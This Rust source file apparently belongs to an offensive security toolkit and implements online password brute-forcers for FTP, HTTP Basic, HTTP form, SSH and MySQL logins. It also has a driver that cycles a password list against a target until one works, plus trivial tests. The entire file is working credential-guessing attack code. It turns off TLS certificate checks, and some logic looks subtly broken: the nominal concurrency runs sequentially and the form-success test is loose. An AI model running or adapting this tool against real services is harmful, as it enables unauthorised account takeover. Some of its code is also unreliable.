use kraken_errors::PasswordError;
use std::io::{BufRead, BufReader, Read, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::time::Duration;

use base64::Engine;

const TIMEOUT: Duration = Duration::from_secs(10);

#[derive(Debug, Clone, Default)]
pub struct BruteForceResult {
    pub target: String,
    pub service: String,
    pub username: String,
    pub password: Option<String>,
    pub success: bool,
}

pub trait OnlineBruteForcer {
    fn service_name(&self) -> &'static str;
    fn try_login(&self, target: &str, username: &str, password: &str) -> Result<bool, PasswordError>;
}

pub struct FtpBruteForcer;
impl FtpBruteForcer {
    fn parse_response<R: BufRead>(reader: &mut R) -> Result<String, PasswordError> {
        let mut line = String::new();
        reader.read_line(&mut line).map_err(PasswordError::Io)?;
        Ok(line.trim().to_string())
    }
}
impl OnlineBruteForcer for FtpBruteForcer {
    fn service_name(&self) -> &'static str { "FTP" }

    fn try_login(&self, target: &str, username: &str, password: &str) -> Result<bool, PasswordError> {
        let addr = target.to_socket_addrs()
            .map_err(|e| PasswordError::Network(format!("DNS error: {}", e)))?
            .next()
            .ok_or_else(|| PasswordError::Network("No address resolved".to_string()))?;

        let mut stream = TcpStream::connect_timeout(&addr, TIMEOUT)
            .map_err(|e| PasswordError::Network(format!("FTP connect failed: {}", e)))?;
        stream.set_read_timeout(Some(TIMEOUT)).ok();
        stream.set_write_timeout(Some(TIMEOUT)).ok();

        let mut reader = BufReader::new(stream.try_clone().map_err(|e| PasswordError::Io(std::io::Error::new(std::io::ErrorKind::Other, e)))?);

        let _banner = Self::parse_response(&mut reader)?;

        writeln!(stream, "USER {}", username).map_err(|e| PasswordError::Network(format!("FTP send USER failed: {}", e)))?;
        let _user_resp = Self::parse_response(&mut reader)?;

        writeln!(stream, "PASS {}", password).map_err(|e| PasswordError::Network(format!("FTP send PASS failed: {}", e)))?;
        let pass_resp = Self::parse_response(&mut reader)?;

        Ok(pass_resp.starts_with("2") || pass_resp.starts_with("230"))
    }
}

pub struct HttpBasicBruteForcer;
impl OnlineBruteForcer for HttpBasicBruteForcer {
    fn service_name(&self) -> &'static str { "HTTP Basic Auth" }

    fn try_login(&self, target: &str, username: &str, password: &str) -> Result<bool, PasswordError> {
        let client = reqwest::blocking::Client::builder()
            .timeout(TIMEOUT)
            .danger_accept_invalid_certs(true)
            .build()
            .map_err(|e| PasswordError::Network(format!("HTTP client error: {}", e)))?;

        let credentials = base64::engine::general_purpose::STANDARD
            .encode(format!("{}:{}", username, password));
        let auth_header = format!("Basic {}", credentials);

        let response = client.get(target)
            .header("Authorization", &auth_header)
            .send()
            .map_err(|e| PasswordError::Network(format!("HTTP request failed: {}", e)))?;

        Ok(response.status().as_u16() != 401 && response.status().as_u16() != 403)
    }
}

pub struct HttpFormBruteForcer {
    pub form_action: String,
    pub username_field: String,
    pub password_field: String,
    pub success_indicator: String,
    pub fail_indicator: Option<String>,
}
impl HttpFormBruteForcer {
    pub fn new(form_action: &str) -> Self {
        HttpFormBruteForcer {
            form_action: form_action.to_string(),
            username_field: "username".to_string(),
            password_field: "password".to_string(),
            success_indicator: "dashboard".to_string(),
            fail_indicator: None,
        }
    }
}
impl OnlineBruteForcer for HttpFormBruteForcer {
    fn service_name(&self) -> &'static str { "HTTP Form Auth" }

    fn try_login(&self, _target: &str, username: &str, password: &str) -> Result<bool, PasswordError> {
        let client = reqwest::blocking::Client::builder()
            .timeout(TIMEOUT)
            .danger_accept_invalid_certs(true)
            .redirect(reqwest::redirect::Policy::none())
            .build()
            .map_err(|e| PasswordError::Network(format!("HTTP client error: {}", e)))?;

        let params = [
            (self.username_field.as_str(), username),
            (self.password_field.as_str(), password),
        ];

        let response = client.post(&self.form_action)
            .form(&params)
            .send()
            .map_err(|e| PasswordError::Network(format!("HTTP POST failed: {}", e)))?;

        let body = response.text().map_err(|e| PasswordError::Network(format!("HTTP read failed: {}", e)))?;

        if let Some(fail) = &self.fail_indicator {
            if body.contains(fail) {
                return Ok(false);
            }
        }

        Ok(body.contains(&self.success_indicator) || !body.contains("invalid") && !body.contains("error") && !body.contains("incorrect"))
    }
}

#[cfg(feature = "ssh")]
pub struct SshBruteForcer;
#[cfg(feature = "ssh")]
impl OnlineBruteForcer for SshBruteForcer {
    fn service_name(&self) -> &'static str { "SSH" }

    fn try_login(&self, target: &str, username: &str, password: &str) -> Result<bool, PasswordError> {
        use ssh2::Session;
        use std::net::TcpStream;
        use std::time::Duration;

        let addr = target.to_socket_addrs()
            .map_err(|e| PasswordError::Network(format!("DNS error: {}", e)))?
            .next()
            .ok_or_else(|| PasswordError::Network("No address resolved".to_string()))?;

        let tcp = TcpStream::connect_timeout(&addr, TIMEOUT)
            .map_err(|e| PasswordError::Network(format!("SSH connect failed: {}", e)))?;
        tcp.set_read_timeout(Some(TIMEOUT)).ok();
        tcp.set_write_timeout(Some(TIMEOUT)).ok();

        let mut session = Session::new().map_err(|e| PasswordError::Protocol(format!("SSH session error: {}", e)))?;
        session.set_tcp_stream(tcp);
        session.handshake().map_err(|e| PasswordError::Protocol(format!("SSH handshake failed: {}", e)))?;

        session.userauth_password(username, password).map_err(|e| e).ok();

        Ok(session.authenticated())
    }
}

pub struct MySqlBruteForcer;
impl MySqlBruteForcer {
    fn mysql_auth_hash(password: &str, auth_plugin_data: &[u8]) -> String {
        use sha1::Digest;
        let sha1_pass = {
            let mut h = sha1::Sha1::new();
            h.update(password.as_bytes());
            h.finalize()
        };
        let mut h = sha1::Sha1::new();
        h.update(sha1_pass);
        let sha1_pass2 = h.finalize();

        let mut h = sha1::Sha1::new();
        h.update(auth_plugin_data);
        h.update(sha1_pass2);
        let result = h.finalize();

        let mut xor_result = Vec::with_capacity(20);
        for (a, b) in sha1_pass.iter().zip(result.iter()) {
            xor_result.push(a ^ b);
        }
        xor_result.iter().map(|b| format!("{:02x}", b)).collect::<String>()
    }
}
impl OnlineBruteForcer for MySqlBruteForcer {
    fn service_name(&self) -> &'static str { "MySQL" }

    fn try_login(&self, target: &str, username: &str, password: &str) -> Result<bool, PasswordError> {
        let addr = target.to_socket_addrs()
            .map_err(|e| PasswordError::Network(format!("DNS error: {}", e)))?
            .next()
            .ok_or_else(|| PasswordError::Network("No address resolved".to_string()))?;

        let mut stream = TcpStream::connect_timeout(&addr, TIMEOUT)
            .map_err(|e| PasswordError::Network(format!("MySQL connect failed: {}", e)))?;
        stream.set_read_timeout(Some(TIMEOUT)).ok();
        stream.set_write_timeout(Some(TIMEOUT)).ok();

        let mut buf = [0u8; 4096];
        let n = stream.read(&mut buf).map_err(PasswordError::Io)?;

        if n < 4 || buf[0] != 0x0a {
            return Err(PasswordError::Protocol("Not a MySQL server".to_string()));
        }

        let protocol_version = buf[4];
        if protocol_version != 10 {
            return Err(PasswordError::Protocol("Unsupported MySQL protocol".to_string()));
        }

        let auth_plugin_data_part1 = &buf[5..13];
        let _server_capabilities = u16::from_le_bytes([buf[18], buf[19]]);

        let offset = 20 + 13;
        let mut auth_plugin_data = auth_plugin_data_part1.to_vec();

        if n > offset {
            let part2_len = 12.min(n.saturating_sub(offset + 1));
            auth_plugin_data.extend_from_slice(&buf[offset..offset + part2_len]);
        }

        let auth_hash = Self::mysql_auth_hash(password, &auth_plugin_data);

        let mut handshake = Vec::new();
        handshake.extend_from_slice(&[0x00; 4]);
        handshake.push(21);
        handshake.extend_from_slice(&[0x00; 4]);
        handshake.extend_from_slice(&[0x00; 4]);
        handshake.extend_from_slice(username.as_bytes());
        handshake.push(0x00);
        handshake.push(auth_hash.len() as u8);
        handshake.extend_from_slice(hex::decode(&auth_hash).unwrap_or_default().as_slice());

        let len = handshake.len() as u32;
        handshake[0..4].copy_from_slice(&len.to_le_bytes());

        stream.write_all(&handshake).map_err(PasswordError::Io)?;

        let n = stream.read(&mut buf).map_err(PasswordError::Io)?;

        let success = n >= 4 && buf[4] == 0x00;
        Ok(success)
    }
}

pub fn brute_force_service(
    forcer: &dyn OnlineBruteForcer,
    target: &str,
    username: &str,
    passwords: &[String],
    concurrency: usize,
) -> Vec<BruteForceResult> {
    let mut results = Vec::new();

    if passwords.is_empty() {
        return results;
    }

    let chunk_size = std::cmp::max(1, passwords.len().div_ceil(concurrency));

    for chunk in passwords.chunks(chunk_size) {
        let mut handles = Vec::new();
        for password in chunk {
            let target = target.to_string();
            let username = username.to_string();
            let password = password.clone();
            let result = (forcer.try_login(&target, &username, &password), password.clone());
            handles.push(result);
        }
        for (result, password) in handles {
            match result {
                Ok(success) => {
                    results.push(BruteForceResult {
                        target: target.to_string(),
                        service: forcer.service_name().to_string(),
                        username: username.to_string(),
                        password: if success { Some(password) } else { None },
                        success,
                    });
                    if success {
                        return results;
                    }
                }
                Err(_e) => {
                    results.push(BruteForceResult {
                        target: target.to_string(),
                        service: forcer.service_name().to_string(),
                        username: username.to_string(),
                        password: None,
                        success: false,
                    });
                }
            }
        }
    }
    results
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_http_basic_forcer_name() {
        let forcer = HttpBasicBruteForcer;
        assert_eq!(forcer.service_name(), "HTTP Basic Auth");
    }

    #[test]
    fn test_ftp_forcer_name() {
        let forcer = FtpBruteForcer;
        assert_eq!(forcer.service_name(), "FTP");
    }

    #[test]
    fn test_mysql_forcer_name() {
        let forcer = MySqlBruteForcer;
        assert_eq!(forcer.service_name(), "MySQL");
    }

    #[test]
    fn test_http_form_forcer() {
        let forcer = HttpFormBruteForcer::new("http://example.com/login");
        assert_eq!(forcer.service_name(), "HTTP Form Auth");
    }

    #[test]
    fn test_brute_force_empty_passwords() {
        let forcer = HttpBasicBruteForcer;
        let results = brute_force_service(&forcer, "http://example.com", "admin", &[], 4);
        assert!(results.is_empty());
    }

    #[test]
    fn test_mysql_auth_hash() {
        let result = MySqlBruteForcer::mysql_auth_hash("test", &[0x01; 20]);
        assert_eq!(result.len(), 40);
        assert!(result.chars().all(|c| c.is_ascii_hexdigit()));
    }

    #[test]
    fn test_ssh_feature_gate() {
        #[cfg(feature = "ssh")]
        {
            let forcer = SshBruteForcer;
            assert_eq!(forcer.service_name(), "SSH");
        }
    }
}
